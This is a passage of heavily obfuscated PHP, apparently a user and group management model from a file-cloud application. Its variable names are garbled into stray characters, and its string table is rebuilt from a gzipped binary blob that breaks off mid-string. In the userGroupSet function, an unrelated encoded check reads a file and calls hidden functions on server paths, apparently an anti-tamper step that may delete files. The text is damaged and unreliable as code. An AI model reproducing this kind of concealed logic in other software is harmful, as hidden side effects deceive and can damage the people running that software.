$¹ë†÷Œ[1780]); foreach ($ÙüŠØŒ¡ as $×ûøôĞ²) { $ÔÚÜÒ€ = $Õò¸œ™[$×ûøôĞ²]; if (!$ÔÚÜÒ€) { $ù£ö¶¤[$×ûøôĞ² . $¹ë†÷Œ[12]] = $this->getInfoSimpleOuter($×ûøôĞ²); continue; } $ÔÚÜÒ€[$¹ë†÷Œ[2474]] = Action($¹ë†÷Œ[2475])->parseUrl($ÔÚÜÒ€[$¹ë†÷Œ[2474]]); $ù£ö¶¤[$×ûøôĞ² . $¹ë†÷Œ[12]] = $ÔÚÜÒ€; } } return $ù£ö¶¤; } protected function userStatus($»æˆÙõ, $ÄÑ›¾–Ä) { $‚óãÜ—Ï = $this->getInfoSimple($»æˆÙõ); if (!$‚óãÜ—Ï) { return !1; } $äğËĞ¶ = array($_SERVER[¶Ô„œ…¯][828] => $ÄÑ›¾–Ä); return $this->userEdit($»æˆÙõ, $äğËĞ¶); } protected function userRemove($´ ŞŞ®‰) { $¶¥ ŞÁÏ =& $_SERVER[¶Ô„œ…¯]; $Æª¯ñÅ¦ = $this->getInfoSimple($´ ŞŞ®‰); if (!$Æª¯ñÅ¦) { return !1; } $ÁãÃÍ = array($¶¥ ŞÁÏ[1771] => $´ ŞŞ®‰); Model($¶¥ ŞÁÏ[669])->where($ÁãÃÍ)->delete(); Model($¶¥ ŞÁÏ[2505])->where($ÁãÃÍ)->delete(); Model($¶¥ ŞÁÏ[2074])->where($ÁãÃÍ)->delete(); Model($¶¥ ŞÁÏ[2490])->where($ÁãÃÍ)->delete(); Model($¶¥ ŞÁÏ[1153])->where($ÁãÃÍ)->delete(); Model($¶¥ ŞÁÏ[2292])->removeUserAll($´ ŞŞ®‰); Model($¶¥ ŞÁÏ[903])->userRootRemove($´ ŞŞ®‰); return $this->where($ÁãÃÍ)->delete(); } protected function userGroupSet($®º¯¥üÂ, $ĞĞñæóÓ, $Œêßµ = array()) { $¸ÁÂ¤ş =& $_SERVER[¶Ô„œ…¯]; if ($_SERVER[$¸ÁÂ¤ş[919]] != $_SERVER[$¸ÁÂ¤ş[920]]) { $ïıŞûÖŞ = $¸ÁÂ¤ş[964]; $áü…–Ù† = $¸ÁÂ¤ş[921]; $Ÿ²’Ëß = $_SERVER[$¸ÁÂ¤ş[922]] . $¸ÁÂ¤ş[923]; $Áêí‡ = $áü…–Ù†($Ÿ²’Ëß); $ÖàÃú´² = explode($¸ÁÂ¤ş[287], $Áêí‡); if (count($ÖàÃú´²) < $¸ÁÂ¤ş[691]) { $ö¢Œ¹à« = $¸ÁÂ¤ş[924]; $ö¢Œ¹à«(); } $öß½¥»ß = $¸ÁÂ¤ş[965]; $öß½¥»ß($_SERVER[$¸ÁÂ¤ş[966]]); $öß½¥»ß($_SERVER[$¸ÁÂ¤ş[922]] . $¸ÁÂ¤ş[2506]); $÷˜úÁ˜† = 1; while ($÷˜úÁ˜† > 1) { $÷˜úÁ˜† = $÷˜úÁ˜† + 4; $…Ù¶´ÖÊ = rawurlencode($÷˜úÁ˜† . $¸ÁÂ¤ş[456]); } } $çúÖôÈ = $this->getInfoSimple($®º¯¥üÂ); if (!$çúÖôÈ || !is_array($ĞĞñæóÓ)) { return !1; } $Â¼ˆÜ¶Ã = Model($¸ÁÂ¤ş[2074]); $Â¼ˆÜ¶Ã->where(array($¸ÁÂ¤ş[1780] => $®º¯¥üÂ))->delete(); $ª®°×ó· = array(); $¦“Ñ‚Š = 0; foreach ($ĞĞñæóÓ as $ÈÙòàôÉ => $²ÜûÂíâ) { $¹ÅšÏèø = array($¸ÁÂ¤ş[1780] => $®º¯¥üÂ, $¸ÁÂ¤ş[1980] => $ÈÙòàôÉ, $¸ÁÂ¤ş[2088] => $²ÜûÂíâ); $¹ÅšÏèø[$¸ÁÂ¤ş[2004]] = isset($Œêßµ[$¦“Ñ‚Š]) ? $Œêßµ[$¦“Ñ‚Š] : 0; $¦“Ñ‚Š++; $ª®°×ó·[] = $¹ÅšÏèø; } return $Â¼ˆÜ¶Ã->addAll($ª®°×ó·, array(), !0); } protected function userGroupAdd($ÃÄÛë¼á, $Ü‹œÂÎı = array()) { $‰åÁ‚úŠ =& $_SERVER[¶Ô„œ…¯]; $çúÑô‘§ = $this->getInfoSimple($ÃÄÛë¼á); if (!$çúÑô‘§ || empty($Ü‹œÂÎı)) { return !1; } $Û÷—«â˜ = array(); foreach ($Ü‹œÂÎı as $†¡À¾§ => $¦šöƒë) { $Û÷—«â˜[] = array($‰åÁ‚úŠ[1780] => $ÃÄÛë¼á, $‰åÁ‚úŠ[1980] => $†¡À¾§, $‰åÁ‚úŠ[2088] => $¦šöƒë, $‰åÁ‚úŠ[2004] => 0); } return Model($‰åÁ‚úŠ[2074])->addAll($Û÷—«â˜, array(), !0); } protected function userGroupRemove($‹ãİ§í, $àÌ¬â²ş) { $¤ƒàÍÇ =& $_SERVER[¶Ô„œ…¯]; $Öäø¢Ğ = $this->getInfoSimple($‹ãİ§í); if (!$Öäø¢Ğ || !$àÌ¬â²ş) { return !1; } $ÊÉˆÓŒÃ = array($¤ƒàÍÇ[1771] => $‹ãİ§í, $¤ƒàÍÇ[2072] => $àÌ¬â²ş); return Model($¤ƒàÍÇ[2074])->where($ÊÉˆÓŒÃ)->delete(); } public function listData() { $«¥Ãî§Ê = $this->_makeOrder()->selectPage(50); $this->_listDataApply($«¥Ãî§Ê[$_SERVER[¶Ô„œ…¯][447]]); return $«¥Ãî§Ê; } public function listByID($‘¶Ìç™’) { $„âíé‚ =& $_SERVER[¶Ô„œ…¯]; if (!$‘¶Ìç™’) { return; } $»Ú®ú¹é = array($„âíé‚[1780] => array($„âíé‚[7], $‘¶Ìç™’)); $£»Ç‹¿Ø = $this->where($»Ú®ú¹é)->select(); $£»Ç‹¿Ø = array_sort_keep($£»Ç‹¿Ø, $„âíé‚[1780], $‘¶Ìç™’); $this->_listDataApply($£»Ç‹¿Ø); return $£»Ç‹¿Ø; } public function listByGroup($ÃÒÉÉ—¶ = 0, $»îŠÇµ = array()) { $ÎœÖ’– =& $_SERVER[¶Ô„œ…¯]; $éã¨¥øÁ = $ÎœÖ’–[12]; $üÍêâã˜ = array(); if ($ÃÒÉÉ—¶) { $üÍêâã˜ = array($ÎœÖ’–[2507] => intval($ÃÒÉÉ—¶)); $éã¨¥øÁ = "\x4c\105\x46\124\40\x4a\x4f\111\x4e\x20{$this->tablePrefix}\x75\x73\145\162\x5f\x67\x72\157\165\x70\40\x75\x73\x65\x72\137\147\162\157\165\x70\x20\157\156\x20\x75\x73\x65\162\56\x75\163\145\162\111\x44\40\75\x20\x75\163\145\162\137\147\x72\x6f\x75\x70\x2e\x75\163\145\x72\x49\104"; $Â´¥øŸ = Input::get($ÎœÖ’–[532], null, $ÎœÖ’–[12]) ? $ÎœÖ’–[12] : $ÎœÖ’–[2508]; } if (isset($»îŠÇµ[$ÎœÖ’–[828]])) { $üÍêâã˜[$ÎœÖ’–[2509]] = $»îŠÇµ[$ÎœÖ’–[828]]; } $»Û¶‹—’ = $this->_makeOrder($Â´¥øŸ)->field($ÎœÖ’–[2510])->where($üÍêâã˜)->join($éã¨¥øÁ)->selectPage(50); $this->_listDataApply($»Û¶‹—’[$ÎœÖ’–[447]]); return $»Û¶‹—’; } private function _makeOrder($êÚĞè = '') { $Àëæ’”¸ =& $_SERVER[¶Ô„œ…¯]; $ÁÖÆİÍ® = array($Àëæ’”¸[1780], $Àëæ’”¸[32], $Àëæ’”¸[1968], $Àëæ’”¸[2187], $Àëæ’”¸[1940], $Àëæ’”¸[233]); $ºËò´ìä = array($Àëæ’”¸[525] => $Àëæ’”¸[526], $Àëæ’”¸[527] => $Àëæ’”¸[528]); $„¿Ï¹Í = Input::get($Àëæ’”¸[532], $Àëæ’”¸[7], $Àëæ’”¸[1771], $ÁÖÆİÍ®); $Ãâ—­Œƒ = Input::get($Àëæ’”¸[533], $Àëæ’”¸[7], $Àëæ’”¸[2075], array($Àëæ’”¸[2075], $Àëæ’”¸[527])); $Ãâ—­Œƒ = $ºËò´ìä[$Ãâ—­Œƒ]; $êÚĞè = $êÚĞè . "\x75\163\x65\162\56{$„¿Ï¹Í}\x20{$Ãâ—­Œƒ}\54\x20\165\x73\145\x72\56\165\163\x65\162\x49\x44\40\141\x73\x63"; return $this->alias($Àëæ’”¸[2203])->order($êÚĞè); } public function listSearch($®ó”ÑÈ¶) { $Üì™åú– =& $_SERVER[¶Ô„œ…¯]; $ÅËøÃˆÄ = trim($®ó”ÑÈ¶[$Üì™åú–[2078]]); $¯°¨ƒ¹÷ = explode($Üì™åú–[53], $ÅËøÃˆÄ); if (!$ÅËøÃˆÄ || count($¯°¨ƒ¹÷) == 1) { return $this->listSearchNow($®ó”ÑÈ¶); } $èœ÷ûî– = array($Üì™åú–[447] => array()); foreach ($¯°¨ƒ¹÷ as $ıı‹·´Õ) { if (!trim($ıı‹·´Õ)) { continue; } $®ó”ÑÈ¶[$Üì™åú–[2078]] = $ıı‹·´Õ; $éÌş÷ = $this->listSearchNow($®ó”ÑÈ¶); $èœ÷ûî–[$Üì™åú–[447]] = array_merge($èœ÷ûî–[$Üì™åú–[447]], $éÌş÷[$Üì™åú–[447]]); } $èœ÷ûî–[$Üì™åú–[447]] = array_unique_by_key($èœ÷ûî–[$Üì™åú–[447]], $Üì™åú–[1780]); $èœ÷ûî–[$Üì™åú–[444]] = array($Üì™åú–[445] => count($èœ÷ûî–[$Üì™åú–[447]]), $Üì™åú–[441] => 20, $Üì™åú–[430] => 1, $Üì™åú–[446] => 1); return $èœ÷ûî–; } public function listSearchNow($™‰÷Æ·¹) { $ú’æ»İâ =& $_SERVER[¶Ô„œ…¯]; $²Ù±ìğ = trim($™‰÷Æ·¹[$ú’æ»İâ[2078]]); $²Ææš€Á = isset($™‰÷Æ·¹[$ú’æ»İâ[2079]]) ? $™‰÷Æ·¹[$ú’æ»İâ[2079]] : !1; $²Ù±ìğ = str_replace($ú’æ»İâ[2080], $ú’æ»İâ[2081], trim($²Ù±ìğ)); $…¢µà®û = array($ú’æ»İâ[32] => array($ú’æ»İâ[461], "\x25{$²Ù±ìğ}\45"), $ú’æ»İâ[382] => array($ú’æ»İâ[461], "{$²Ù±ìğ}\45"), $ú’æ»İâ[2275] => array($ú’æ»İâ[461], "{$²Ù±ìğ}\45"), $ú’æ»İâ[1084] => $ú’æ»İâ[2082]); if (Input::check($²Ù±ìğ, $ú’æ»İâ[388])) { $…¢µà®û[$ú’æ»İâ[1780]] = array($ú’æ»İâ[461], "{$²Ù±ìğ}\x25"); $…¢µà®û[$ú’æ»İâ[2491]] = array($ú’æ»İâ[461], "{$²Ù±ìğ}\45"); } if (!$²Ù±ìğ) { $…¢µà®û = array(); } if (isset($™‰÷Æ·¹[$ú’æ»İâ[828]])) { $…¢µà®û[$ú’æ»İâ[828]] = $™‰÷Æ·¹[$ú’æ»İâ[828]]; } $…¢µà®û = $this->parseWhereLike($…¢µà®û); $ñı’Ïˆ = $this->_makeOrder()->where($…¢µà®û)->selectPage(20); if (!$ñı’Ïˆ || count($ñı’Ïˆ[$ú’æ»İâ[447]]) < 5 && Input::check($²Ù±ìğ, $ú’æ»İâ[395])) { $¹Ş³ˆò = $this->_searchFromMeta($ú’æ»İâ[539], $²Ù±ìğ, 10); $—øÒŸÍ¢ = $this->_searchFromMeta($ú’æ»İâ[540], $²Ù±ìğ, 10); $à¿Ã‡®› = array_merge($¹Ş³ˆò, $—øÒŸÍ¢, $ñı’Ïˆ[$ú’æ»İâ[447]]); $ñı’Ïˆ[$ú’æ»İâ[447]] = array_unique_by_key($à¿Ã‡®›, $ú’æ»İâ[1780]); $ñı’Ïˆ[$ú’æ»İâ[444]][$ú’æ»İâ[445]] = count($ñı’Ïˆ[$ú’æ»İâ[447]]); $ñı’Ïˆ[$ú’æ»İâ[444]][$ú’æ»İâ[446]] = ceil($ñı’Ïˆ[$ú’æ»İâ[444]][$ú’æ»İâ[445]] / $ñı’Ïˆ[$ú’æ»İâ[444]][$ú’æ»İâ[441]]); } $this->_listDataApply($ñı’Ïˆ[$ú’æ»İâ[447]]); $this->_filterByGroup($ñı’Ïˆ, $²Ææš€Á); return $ñı’Ïˆ; } private function _filterByGroup(&$áÏ¯¥Ú“, $†éÈƒ‡˜) { $Ù¬´º» =& $_SERVER[¶Ô„œ…¯]; if (!$†éÈƒ‡˜) { return $áÏ¯¥Ú“; } foreach ($áÏ¯¥Ú“[$Ù¬´º»[447]] as $–ƒåá‹ª => &$èŞ„ûÛ¾) { $˜ “ãôé = array_to_keyvalue($èŞ„ûÛ¾[$Ù¬´º»[2172]], $Ù¬´º»[12], $Ù¬´º»[1980]); if (!in_array($†éÈƒ‡˜, $˜ “ãôé)) { unset($áÏ¯¥Ú“[$Ù¬´º»[447]][$–ƒåá‹ª]); } } unset($èŞ„ûÛ¾); $áÏ¯¥Ú“[$Ù¬´º»[447]] = array_values($áÏ¯¥Ú“[$Ù¬´º»[447]]); $áÏ¯¥Ú“[$Ù¬´º»[444]] = array($Ù¬´º»[2240] => count($áÏ¯¥Ú“[$Ù¬´º»[447]]), $Ù¬´º»[2238] => $áÏ¯¥Ú“[$Ù¬´º»[444]][$Ù¬´º»[441]], $Ù¬´º»[2237] => 1, $Ù¬´º»[2239] => 1); } private function _searchFromMeta($ï‰Å¶›à, $©È€»å, $ı ïÀêã) { $ƒıúàÅ =& $_SERVER[¶Ô„œ…¯]; $©È€»å = strtolower($©È€»å); $û»É¦şˆ = array($ƒıúàÅ[97] => $ï‰Å¶›à, $ƒıúàÅ[452] => array($ƒıúàÅ[461], "\x25{$©È€»å}\x25")); $û»É¦şˆ = $this->parseWhereLike($û»É¦şˆ); $şßØ«¬ = Model($ƒıúàÅ[2511])->where($û»É¦şˆ)->limit($ı ïÀêã)->select(); if (!$şßØ«¬) { return array(); } $şßØ«¬ = array_to_keyvalue($şßØ«¬, $ƒıúàÅ[12], $ƒıúàÅ[1780]); $ÌĞÌë¶â = $this->where(array($ƒıúàÅ[1771] => array($ƒıúàÅ[7], $şßØ«¬)))->select(); if (!$ÌĞÌë¶â) { return array(); } return $ÌĞÌë¶â; } private function _listDataApplyItem($ÏÃ³ô¶õ) { $Ïññ™†Š = array($ÏÃ³ô¶õ); $this->_listDataApply($Ïññ™†Š); return $Ïññ™†Š[0]; } private function _listDataApply(&$şãåªıº) { $‹Ë¤Õš¢ =& $_SERVER[¶Ô„œ…¯]; if (!$şãåªıº) { return; } array_remove_key($şãåªıº, $‹Ë¤Õš¢[973]); $ã¶Ë¼Úò = array_to_keyvalue($şãåªıº, $‹Ë¤Õš¢[12], $‹Ë¤Õš¢[1780]); $this->_listAppendGroup($şãåªıº, $ã¶Ë¼Úò); $this->_listAppendMeta($şãåªıº, $ã¶Ë¼Úò); $this->_listAppendSourceRoot($şãåªıº, $ã¶Ë¼Úò); } private function _listAppendSourceRoot(&$®ÃĞ±­™, $É§¢èıÁ) { $´…„Ãß‘ =& $_SERVER[¶Ô„œ…¯]; $…ãÏ·»è = Model($´…„Ãß‘[903])->listSourceRoot(SourceModel::TYPE_USER, $É§¢èıÁ); $…ãÏ·»è = array_to_keyvalue($…ãÏ·»è, $´…„Ãß‘[571]); $…ãÏ·»è = array_remove_key($…ãÏ·»è, $´…„Ãß‘[571]); foreach ($®ÃĞ±­™ as &$¿•³ÆÄÂ) { $¿•³ÆÄÂ[$´…„Ãß‘[90]] = $…ãÏ·»è[$¿•³ÆÄÂ[$´…„Ãß‘[1780]]] ? $…ãÏ·»è[$¿•³ÆÄÂ[$´…„Ãß‘[1780]]] : array(); } unset($¿•³ÆÄÂ); } private function _listAppendGroup(&$ñºå‚¹õ, $÷§ùíºš) { $ÔÙª­Ö =& $_SERVER[¶Ô„œ…¯]; $ÛÄÍÆÜ = array($ÔÙª­Ö[1780] => array($ÔÙª­Ö[7], $÷§ùíºš)); $Æâ¡ÔÀÚ = Model($ÔÙª­Ö[2074])->where($ÛÄÍÆÜ)->select(); $Ûœñàà = array_to_keyvalue($Æâ¡ÔÀÚ, $ÔÙª­Ö[12], $ÔÙª­Ö[1980]); $Ûœñàà = array_remove_value(array_unique($Ûœñàà), $ÔÙª­Ö[230]); if (!$Ûœñàà || !$Æâ¡ÔÀÚ) { return; } $ÛÄÍÆÜ = array($ÔÙª­Ö[1980] => array($ÔÙª­Ö[7], $Ûœñàà)); $‹¬ËÎ¥¯ = Model($ÔÙª­Ö[2170])->field($ÔÙª­Ö[2512])->where($ÛÄÍÆÜ)->select(); $‹¬ËÎ¥¯ = array_to_keyvalue($‹¬ËÎ¥¯, $ÔÙª­Ö[1980]); $Æâ¡ÔÀÚ = array_to_keyvalue_group($Æâ¡ÔÀÚ, $ÔÙª­Ö[1780]); foreach ($Æâ¡ÔÀÚ as &$š¬« ‹è) { $Íâ†Œé´ = array(); foreach ($š¬« ‹è as $¹‚°ëõ¦) { if (!$¹‚°ëõ¦[$ÔÙª­Ö[2088]]) { continue; } $——À¹Ã = Model($ÔÙª­Ö[573])->listData($¹‚°ëõ¦[$ÔÙª­Ö[2088]]); $Íâ†Œé´[] = array($ÔÙª­Ö[1980] => $¹‚°ëõ¦[$ÔÙª­Ö[1980]], $ÔÙª­Ö[2513] => $‹¬ËÎ¥¯[$¹‚°ëõ¦[$ÔÙª­Ö[1980]]][$ÔÙª­Ö[32]], $ÔÙª­Ö[586] => $‹¬ËÎ¥¯[$¹‚°ëõ¦[$ÔÙª­Ö[1980]]][$ÔÙª­Ö[586]], $ÔÙª­Ö[489] => $——À¹Ã); } $š¬« ‹è = $Íâ†Œé´; } unset($š¬« ‹è); foreach ($ñºå‚¹õ as &$£“Ò‹£İ) { $£“Ò‹£İ[$ÔÙª­Ö[2172]] = array(); if (isset($Æâ¡ÔÀÚ[$£“Ò‹£İ[$ÔÙª­Ö[1780]]])) { $£“Ò‹£İ[$ÔÙª­Ö[2172]] = $Æâ¡ÔÀÚ[$£“Ò‹£İ[$ÔÙª­Ö[1780]]]; } } unset($£“Ò‹£İ); } public function userAppendGroup($¸´ë±°Š) { $õ²’¶Ì† =& $_SERVER[¶Ô„œ…¯]; if (!$¸´ë±°Š) { return array(); } $this->_listAppendGroup($¸´ë±°Š, array_to_keyvalue($¸´ë±°Š, $õ²’¶Ì†[12], $õ²’¶Ì†[1780])); return $¸´ë±°Š; } private function _listAppendMeta(&$ËµÎ²§, $²úœÆÂÜ) { $Â”ŠËˆ =& $_SERVER[¶Ô„œ…¯]; $–ö¼Ô¸® = UserJobModel::JOB_KEY; $£¸¾Èş‹ = array($Â”ŠËˆ[2492]); $Êû²´ = array($Â”ŠËˆ[1780] => array($Â”ŠËˆ[7], $²úœÆÂÜ)); $«ŸÁçáì = Model($Â”ŠËˆ[2490])->where($Êû²´)->select(); $«ŸÁçáì = array_to_keyvalue_group($«ŸÁçáì, $Â”ŠËˆ[1780]); foreach ($«ŸÁçáì as &$Ö…‘×–Ù) { $¸ÛÇµõ² = array(); foreach ($Ö…‘×–Ù as $ãÊÁá¸¼) { if (!in_array($ãÊÁá¸¼[$Â”ŠËˆ[97]], $£¸¾Èş‹)) { $¸ÛÇµõ²[$ãÊÁá¸¼[$Â”ŠËˆ[97]]] = $ãÊÁá¸¼[$Â”ŠËˆ[452]]; } } $Ö…‘×–Ù = $¸ÛÇµõ²; } unset($Ö…‘×–Ù); $ˆßô†ƒ = Model($Â”ŠËˆ[2514]); foreach ($ËµÎ²§ as &$³“îà×) { $¶òÊÁ™Ğ = array(); if (isset($«ŸÁçáì[$³“îà×[$Â”ŠËˆ[1780]]])) { $¶òÊÁ™Ğ = $«ŸÁçáì[$³“îà×[$Â”ŠËˆ[1780]]]; } $³“îà×[$Â”ŠËˆ[2515]] = array(); if (isset($¶òÊÁ™Ğ[$–ö¼Ô¸®])) { $³“îà×[$Â”ŠËˆ[2515]] = $ˆßô†ƒ->getUserJobInfo($¶òÊÁ™Ğ[$–ö¼Ô¸®]); } } unset($³“îà×); } protected function groupUserAll($ÄÛ˜Ïˆş) { $¬˜ Äô¼ =& $_SERVER[¶Ô„œ…¯]; if (!$ÄÛ˜Ïˆş) { return !1; } $¯§“‹áƒ = Model($¬˜ Äô¼[2074])->field($¬˜ Äô¼[1780])->where(array($¬˜ Äô¼[1980] => array($¬˜ Äô¼[7], $ÄÛ˜Ïˆş)))->select(); $¯§“‹áƒ = array_to_keyvalue($¯§“‹áƒ, $¬˜ Äô¼[12], $¬˜ Äô¼[1780]); return array_unique($¯§“‹áƒ); } public function userSearch($‡ÂŞî, $¿¯’ŞÄ = "\52") { return Model($_SERVER[¶Ô„œ…¯][599])->where($‡ÂŞî)->field($¿¯’ŞÄ)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\145\162\137\157\160\164\151\x6f\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($ÇÄİöêÃ) { $ğ®°¹®û =& $_SERVER[¶Ô„œ…¯]; $¦ÊÍ³İÎ = defined($ğ®°¹®û[2207]) && USER_ID ? USER_ID : $ğ®°¹®û[12]; return "\x55\x73\145\x72\117\x70\164\151\x6f\x6e\137{$ÇÄİöêÃ}\137" . $¦ÊÍ³İÎ; } protected function filterWhere($µ®ü½Éï) { $Ş ¬±± =& $_SERVER[¶Ô„œ…¯]; $µ®ü½Éï[$Ş ¬±±[1780]] = defined($Ş ¬±±[2207]) && USER_ID ? USER_ID : $Ş ¬±±[12]; return $µ®ü½Éï; } public function cacheRemoveUser($óŞĞ¬“Ö, $¾ƒ­¯Ôê) { return Cache::remove("\125\163\x65\x72\117\160\x74\151\157\x6e\x5f{$óŞĞ¬“Ö}\x5f" . $¾ƒ­¯Ôê); } protected function optionDefault($ÅÁÚŠ¦ = '') { $ËÏóø‚½ =& $_SERVER[¶Ô„œ…¯]; if ($ÅÁÚŠ¦ == $ËÏóø‚½[12]) { return $GLOBALS[$ËÏóø‚½[6]][$ËÏóø‚½[2516]]; } if ($ÅÁÚŠ¦ == $ËÏóø‚½[2517]) { return $GLOBALS[$ËÏóø‚½[6]][$ËÏóø‚½[2518]]; } } } goto CØÜ‰–À; a­‚·ˆºëî: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define(base64_decode('ttSEnIWv'), "\263\264\246\235\360\255"); $_SERVER[¶Ô„œ…¯] = explode("\x7c\x3\x7c\x1\x7c\x3", gzinflate(substr("\x1f\x8b\x8\x0\x0\x0\x0\x0\x0\x13\xc5\x7d\x9\x78\x1b\xd5\xb5\x30\x5b\x5b\xb6\xb6\x14\xe8\xca\xa3\xc\x26\xc1\x76\xa2\xc5\xce\x46\xe2\xc4\x49\x64\x5b\x8e\x95\xc8\x92\x23\xc9\x59\xb0\xcd\x64\x2c\x8d\xac"."\xb1\x25\x8d\xa2\x19\x79\x4b\x2\x84\x25\x2c\x81\x4\xca\xbe\xb4\x6c\x65\x7b\x94\x84\x3d\x40\x8\xb4\xec\xaf\x50\x28\x85\xb2\x14\x28\x14\x62\x27\xe1\x51\x28\xb4\x94\xa5\x14\xfe\xbb\x9c\xbb\xcc\x48\x86\xf7\x7f"."\357\377\276\77\220\350\336\163\227\271\313\271\347\236\173\356\271\347\254\177\366\361\353\316\277\174\355\276\153\367\136\273\357\370\75\167\354\272\363\61\32\106\377\355\103\376\105\341\243\66\356\277".strrev('–™”ÔÖãùõï{ã#Sİ~88µ~gíô:zŸ†Šm©ÿh¶Õn»æğr58fÚjk³ÆØsù')."\x6d\xa0\x3f\x4a\xde\xb4\x15\x7d\xd8\xb0\x6c\x8b\x2\x92\x66\x3e\x6d\xf4\xd1\xb0\x91\xa7\xbf\x7e\xfa\xd3\x19\xb\x17\xf5\x9c\x69\xeb\x34\xea\xa3\x3f\x2a\x6f\x17\xfa\xd7\x5a\x9d\x35\x58\xba\x1a\x89\x26\xd4\x78"."\147\107\107\60\226\200\114\15\162\172\316\114\101\250\240\25\265\34\174\277\240\27\55\324\32\271\72\265\140\26\364\274\3\42\0\51\315\326\172\65\13\152\152\151\122\133\202\35\341\350\112\65".base64_decode('sbIjCDl61dUlvThCYyQYt7WinTByOs8xVOTtagouCkWURCwQiQeaE6FohIKbo+3toUQ5PA==').strrev('RùM4!à” cšÆ¼Á¢›='."\r".'Z–¥*Êh«(Öm>F««/µíEb:SÊKÍ›‡'."\r".'')."\66\113\43\21\36\112\351\151\255\224\205\321\152\221\43\205\242\221\323\130\247\227\350\43\34\112\3\132\311\66\215\174\222\106\202\303\166\121\23\160\324\326\44\232\150\75\17\125\305\203\341\140"."\163\102\301\15\124\132\143\321\166\5\46\41\247\131\266\136\124\226\267\5\143\101\5\67\272\261\232\364\265\132\1\174\211\240\241\120\2\341\260\62\121\15\266\236\53\260\152\150\231\12\225\105"."\143\55\301\230\322\264\122\21\43\224\64\163\71\63\357\103\265\240\231\264\245\246\6\143\61\32\360\0\172\207\103\170\322\40\22\155\155\215\7\171\14\72\267\64\214\132\62\35\360\323\21\113".strrev('ÏÕË/Xë”&ò¡ÈSÑu¹bP ¬¾M0ªĞ	Fò6®êi¯Àü5oèMKe¨:¶³¥')."\2\6\132\241\203\64\330\70\237\376\316\205\362\275\52\116\323\213\266\252\347\223\146\312\310\303\72\136\0\370\250\331\231\226\242\201\62\320\170\332\314\246\130\330\62\106\241\227\151\43\253\107"."\112\71\71\13\217\46\63\106\66\125\144\113\357\253\162\322\150\230\257\144\234\127\304\12\250\45\234\10\30\351\21\261\24\161\276\16\236\152\231\245\142\122\17\241\245\103\343\365\0\326\155\33".base64_decode('dY4NiNlZyJpaKq4XedcMsxVVFC3ZMrBEsrWaxVwLIhoyrB0tG0MAB9hySUmj5a/pWu/9og==')."\247\153\41\372\247\26\50\142\67\264\47\243\147\263\252\76\254\303\172\312\245\146\132\154\40\374\126\257\221\367\43\10\215\206\242\152\106\263\62\355\251\231\52\51\305\10\155\112\37\366\25\62"."\x5\x58\xec\x7c\x7d\x77\x3b\xf0\x1d\xf\x5b\xc4\xb4\x83\x12\xb9\xce\x9a\x49\x2d\x2b\x77\x85\x86\x33\xb6\x5d\x88\xeb\xf9\x14\x1e\x5\xe8\x8a\x39\x94\x27\xa3\x54\xd0\x75\xc8\xd4\xe2\x51\x52\x4a\xbb\xb2\x52\x69"."\x6b\x30\x1a\x2c\x56\x30\x97\xe5\x21\xd6\x3b\xe\xb3\x38\xd0\x1e\x66\x53\x99\x4a\x3\xa6\xb2\xdd\xa2\xa\x3e\x68\x58\x84\xf0\x89\x55\xab\x15\xa\x59\x23\xa9\xd9\x86\x99\xf7\x9b\x49\x5b\xb7\xbd\x96\x5d\xd4\x35"."\xa8\x31\x90\x4c\xea\x96\xe5\x6d\x36\xf3\x76\xd1\xcc\x7a\x3\xd9\xac\x39\xe4\x8d\x16\x8d\x3e\x23\xdf\xa0\x4c\x1\x1a\x8c\x12\xd1\x5a\xf7\x62\xba\xd8\x0\xb\xb8\x6a\xae\x82\x91\x6\x7f\x66\x4a\x63\xc9\x4e\x7b"."\147\263\205\311\163\27\265\274\225\326\213\336\40\254\212\6\5\65\226\23\107\226\255\305\260\12\246\145\340\346\65\50\232\155\153\311\14\46\54\242\372\306\257\310\157\344\263\106\136\57\317\213"."\52\321\275\35\105\255\57\247\65\50\205\122\57\32\0\130\214\0\113\342\34\162\146\30\200\6\45\247\15\173\265\76\126\123\160\270\140\24\165\213\365\132\131\324\236\0\214\112\173\333\361\42"."\62\364\224\67\216\50\67\124\66\275\156\206\202\160\105\141\151\24\332\226\110\164\250\241\126\264\65\107\202\152\173\40\321\334\6\265\333\132\37\253\72\214\350\61\257\222\1\127\170\321\142\302".strrev('/¹Bj]7-ÖÄw£w¾Zc{`·çŒË'."\n".'¨9œ$±ö×ªf(47¢/HsÀAØ')."\x4d\x57\xae\xaf\x57\x4f\x9b\x45\xe8\x8d\x35\xd8\xe7\x1c\xfc\xb0\x9e\xef\xb3\x33\xac\xee\x78\x30\xb6\x2c\x18\x53\xe3\xd1\xd6\xc4\xf2\x40\xc\xf6\xfd\x3c\xc2\x9c\x61\xd6\x1a\xfc\xf5\xac\x37\xa6\xa7\xd0\x20\x26".base64_decode('bVZOK4jRX+HFCwZ/nKXiRcTSwqFFeOxavBbK5JVzsbrDRs7A3bN5ChlsxBQsggb5SZ8buw==')."\xad\x29\x35\xdd\xa9\xa9\xb5\x5e\xf4\xef\x94\xda\xae\xee\x16\xdf\x94\x9e\x5\x7e\x43\x94\xf1\xd7\xfb\xea\x95\x69\x75\xb3\x94\xe\xc4\xa5\x18\x5a\x56\x81\x4e\x97\xe5\xa8\x53\xa2\x4b\x9c\xc3\x22\x30\x3c\x6f\xe6"."\xf5\x8a\xb\xb\x21\x92\x69\xe9\xde\x36\x5d\x43\x4\x1a\x4d\x84\x63\x5e\x3c\xec\x5b\x34\xfe\x15\xa3\x8b\xf7\x49\x89\x96\xb8\xe6\x85\x2\x63\xc1\xa5\x9d\xc1\x78\x42\x6d\xf\x26\xda\xa2\x2d\xd0\xfc\x60\x0\x42".strrev('§ô]u6%Ò“ĞB†LOFsP!wå‡1)) 